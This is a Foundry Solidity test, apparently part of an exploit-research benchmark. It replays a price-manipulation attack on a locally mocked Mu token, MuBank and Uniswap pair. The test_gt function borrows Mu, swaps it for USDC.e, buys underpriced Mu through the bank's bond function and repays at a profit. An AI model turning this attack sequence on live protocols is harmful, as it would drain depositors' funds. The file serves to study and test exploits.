// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./AttackContract.sol";
import "./Mu.sol";
import "./MuBank.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {USDCE} from "@utils/USDCE.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract MUMUGTest is Test, BlockLoader {
    Mu mu;
    USDCE usdce;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    MuBank mubank;
    AttackContract attackContract;
    address owner;
    address attacker;
    address muAddr;
    address usdceAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address mubankAddr;
    address attackContractAddr;
    uint256 blockTimestamp = 1670635293;
    uint112 reserve0pair = 110596398651;
    uint112 reserve1pair = 172739951491310439336991;
    uint32 blockTimestampLastpair = 1670632626;
    uint256 kLastpair = 19102449214934407600169207587014640;
    uint256 price0CumulativeLastpair =
        308814746138342549066779453499621908384171319637193787;
    uint256 price1CumulativeLastpair = 108977737583418847522328147893;
    uint256 totalSupplymu = 1000000000000000000000000;
    uint256 balanceOfmumubank = 100000000000000000000000;
    uint256 balanceOfmupair = 172739951491310439336991;
    uint256 balanceOfmuattacker = 0;
    uint256 totalSupplyusdce = 193102891951559;
    uint256 balanceOfusdcemubank = 0;
    uint256 balanceOfusdcepair = 110596398651;
    uint256 balanceOfusdceattacker = 0;

    function setUp() public {
        owner = address(this);
        mu = new Mu(totalSupplymu);
        muAddr = address(mu);
        usdce = new USDCE();
        usdceAddr = address(usdce);
        pair = new UniswapV2Pair(
            address(usdce),
            address(mu),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        mubank = new MuBank(address(router), address(pair), address(mu));
        mubankAddr = address(mubank);
        attackContract = new AttackContract();
        attackContractAddr = address(attackContract);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        usdce.transfer(address(pair), balanceOfusdcepair);
        mu.transfer(address(pair), balanceOfmupair);
        mu.transfer(address(mubank), balanceOfmumubank);
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Mu Balances: ");
        queryERC20BalanceDecimals(
            address(usdce),
            address(mu),
            usdce.decimals()
        );
        queryERC20BalanceDecimals(address(mu), address(mu), mu.decimals());
        emit log_string("");
        emit log_string("Usdce Balances: ");
        queryERC20BalanceDecimals(
            address(usdce),
            address(usdce),
            usdce.decimals()
        );
        queryERC20BalanceDecimals(address(mu), address(usdce), mu.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdce),
            address(pair),
            usdce.decimals()
        );
        queryERC20BalanceDecimals(address(mu), address(pair), mu.decimals());
        emit log_string("");
        emit log_string("Mubank Balances: ");
        queryERC20BalanceDecimals(
            address(usdce),
            address(mubank),
            usdce.decimals()
        );
        queryERC20BalanceDecimals(address(mu), address(mubank), mu.decimals());
        emit log_string("");
        emit log_string("Attackcontract Balances: ");
        queryERC20BalanceDecimals(
            address(usdce),
            address(attackContract),
            usdce.decimals()
        );
        queryERC20BalanceDecimals(
            address(mu),
            address(attackContract),
            mu.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdce.balanceOf(attacker) >= 1e6 + balanceOfusdceattacker;
    }

    function nop(uint256 amount) internal pure {
        return;
    }

    function borrow_owner_usdce(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
        usdce.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_owner_usdce(uint256 amount) internal {
        usdce.transfer(owner, amount);
    }

    function borrow_owner_mu(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
        mu.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_owner_mu(uint256 amount) internal {
        mu.transfer(owner, amount);
    }

    function borrow_pair_usdce(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pair));
        usdce.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pair_usdce(uint256 amount) internal {
        usdce.transfer(address(pair), amount);
    }

    function borrow_pair_mu(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pair));
        mu.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pair_mu(uint256 amount) internal {
        mu.transfer(address(pair), amount);
    }

    function swap_pair_usdce_mu(uint256 amount) internal {
        usdce.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(usdce);
        path[1] = address(mu);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pair_mu_usdce(uint256 amount) internal {
        mu.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(mu);
        path[1] = address(usdce);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function sync_pair() internal {
        pair.sync();
    }

    function swap_mubank_usdce_mu(uint256 sendAmount) internal {
        usdce.approve(address(mubank), type(uint).max);
        mubank.mu_bond(address(usdce), sendAmount);
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_owner_mu(99000e18);
        printBalance("After step0 ");
        swap_pair_mu_usdce(99000e18);
        printBalance("After step1 ");
        swap_mubank_usdce_mu(22960e18);
        printBalance("After step2 ");
        payback_owner_mu(99297e18);
        printBalance("After step3 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_mu(amt0);
        swap_pair_mu_usdce(amt1);
        swap_mubank_usdce_mu(amt2);
        payback_owner_mu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
